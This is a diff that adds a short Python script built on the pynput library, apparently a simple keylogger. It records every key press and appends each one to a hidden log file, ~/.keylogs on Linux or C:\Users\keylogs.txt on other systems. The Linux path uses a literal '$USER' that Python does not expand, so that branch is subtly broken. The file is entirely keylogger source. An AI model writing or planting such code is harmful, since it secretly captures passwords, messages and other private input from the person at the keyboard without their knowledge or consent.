@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+""" Import """
+import platform
+from pynput.keyboard import Key, Listener
+
+
+def press_keys(key):
+    if platform.system() == 'Linux':
+        with open('/home/$USER/.keylogs', 'a') as fp:
+            fp.write(str(key) + '\n')
+    else:
+        with open('C:\\Users\\keylogs.txt', 'a') as fp:
+            fp.write(str(key) + '\n')
+
+with Listener(on_press=press_keys) as listener:
+    listener.join()
